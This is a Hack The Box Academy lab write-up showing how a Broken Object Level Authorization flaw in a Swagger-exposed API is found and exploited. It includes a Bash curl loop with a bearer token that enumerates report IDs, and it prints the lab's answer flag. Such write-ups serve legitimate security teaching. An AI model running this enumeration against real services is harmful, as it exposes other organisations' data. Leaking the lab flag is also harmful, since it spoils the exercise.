# Hack The Box Academy - Broken Object Level Authorization | Write-up

> **Platform:** Hack The Box Academy &nbsp;•&nbsp; **Category:** API / Web &nbsp;•&nbsp; **Difficulty:** Easy
>
> **Target:** `154.57.164.82:31067` &nbsp;•&nbsp; **Time taken:** 15 mins
>
> **Author:** Jithin Jelson

---

## Introduction

This lab tells us that there is a Swagger endpoint left on by the developers and that there is a Broken Object Level Authorization attack we can implement to receive our flag.

Credentials given: `htbpentester2@pentestercompany.com : HTBPentester2`

---

## Assessment Overview

```mermaid
flowchart LR
    A[Exposed Swagger UI<br/>Inlanefreight API]:::entry --> B[Sign in as<br/>pentester2<br/>obtain JWT]:::entry
    B --> C[Recon<br/>who am I?]:::intel
    C --> D[roles/current-user<br/>two roles found]:::intel
    C --> E[supplier-companies/<br/>current-user<br/>my id b75a7c76]:::intel
    D --> F[SupplierCompanies_<br/>GetYearlyReportByID]:::payload
    D --> G[Suppliers_<br/>GetQuarterlyReportByID]:::payload
    F --> H[yearly-reports/1<br/>reveals another<br/>company's data<br/>BOLA confirmed]:::mitre
    G --> I[Loop quarterly-reports<br/>IDs 1 to 20]:::mitre
    I --> J[Flag found in<br/>report id 8]:::user

    classDef entry fill:#1d4ed8,stroke:#1e3a8a,color:#ffffff;
    classDef ioc fill:#0f766e,stroke:#134e4a,color:#ffffff;
    classDef intel fill:#7c3aed,stroke:#5b21b6,color:#ffffff;
    classDef mitre fill:#b45309,stroke:#78350f,color:#ffffff;
    classDef payload fill:#be123c,stroke:#881337,color:#ffffff;
    classDef user fill:#15803d,stroke:#14532d,color:#ffffff;
    linkStyle default stroke-width:2px
```

---

## What I Learned

- How to authorise myself against a Swagger API by signing in and pasting the returned JWT into the padlock.
- Reading the roles of the currently authenticated user to work out exactly which endpoints my account can reach.
- Why an integer ID parameter is a warning sign, because a plain sequential number is far easier to enumerate than a random UUID.
- Confirming a Broken Object Level Authorization flaw by requesting a record whose company ID does not match my own.
- Automating the abuse with a Bash for-loop so I could pull many reports in one go instead of clicking one at a time.
- That the whole bug comes down to the server checking I am logged in but never checking the record actually belongs to me.

---

## Authorising Against the API

We can start by navigating to our homepage with the target IP followed by `/swagger/index`.

We have been told to use the `/api/v1/authentication/suppliers/sign-in` to input our credentials to authorise our JWT token.

![Sign-in endpoint with pentester2 credentials](images/01-signin-pentester2.png)

*Figure 1 - Signing in as pentester2 through the suppliers/sign-in endpoint*

We can scroll down and get our token.

![JWT token in the response body](images/02-jwt-token-response.png)

*Figure 2 - The JWT returned in the sign-in response*

We will now use this to authorise ourselves at the top of the page with the padlock. The unlocked icon means we are not authorised and the lock means we are authorised.

![Authorize popup before authorisation](images/03-authorize-before.png)

*Figure 3 - Pasting the JWT into the Authorize popup, before authorisation*

![Padlock locked after authorisation](images/04-authorize-after.png)

*Figure 4 - After authorisation, the padlock is now locked*

---

## Checking Who We Are

Now we can see what user we are currently logged in as. We can see that in the following `/api/v1/roles/current-user`. We will execute now.

![roles/current-user request](images/05-roles-current-user-request.png)

*Figure 5 - The roles/current-user endpoint ready to execute*

We can see as the current user these are the roles we have access to.

![roles/current-user response showing two roles](images/06-roles-current-user-response.png)

*Figure 6 - Our user holds SupplierCompanies_GetYearlyReportByID and Suppliers_GetQuarterlyReportByID*

Now let's have a look at our current user information as well. We can get that by executing the following `/api/v1/supplier-companies/current-user`.

![supplier-companies/current-user response with our id](images/07-supplier-company-current-user.png)

*Figure 7 - Our own company id is b75a7c76-e149-4ca7-9c55-d9fc4ffa87be*

We will note down our id, as in this exploit we will be able to see and access stuff that is not tied to our id.

---

## Testing the BOLA on Yearly Reports

Now we can go to the roles we have access to `/api/v1/supplier-companies/yearly-reports/{ID}`. Since it is int32 it means it is a plain number and not the UUID we are looking for.

![yearly-reports/{ID} endpoint showing int32 parameter](images/08-yearly-reports-endpoint.png)

*Figure 8 - The yearly-reports endpoint takes an integer ID, not a UUID*

If we enter 1 and execute it we can see the following.

![yearly-reports/1 response with a different company id](images/09-yearly-report-1.png)

*Figure 9 - Report id 1 belongs to company f9e58492, which is not our id*

This isn't our id from earlier and we are able to see the yearly report for other companies.

---

## Automating the Attack and Getting the Flag

We can automate this to achieve and find our flag.

```bash
for ((i=1; i<= 20; i++)); do
  curl -s -w "\n" -X 'GET' \
    'http://154.57.164.82:31067/api/v1/suppliers/quarterly-reports/'$i'' \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc4ODIwNzE5OCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.wBA7gb_eYjPVyS1lsmWFQyIefoBcyGySYCxJ7DDmA3kz5NIf8TBqVoRdbv_b6LlrHlOohBt_wHCm29LwdmdD8Q' | jq
done
```

The `-w "\n"` is for printing things on a new line, `-s` is to silence the progress and `jq` to get it in a readable format.

![Flag found in one of the quarterly report responses](images/10-flag-quarterly-report.png)

*Figure 10 - The flag appears in the commentsFromManager field of quarterly report id 8*

And we can see our flag in one of the responses.

> **What is the flag?**

**Answer:** `HTB{e76651e1f516eb5d7260621c26754776}`
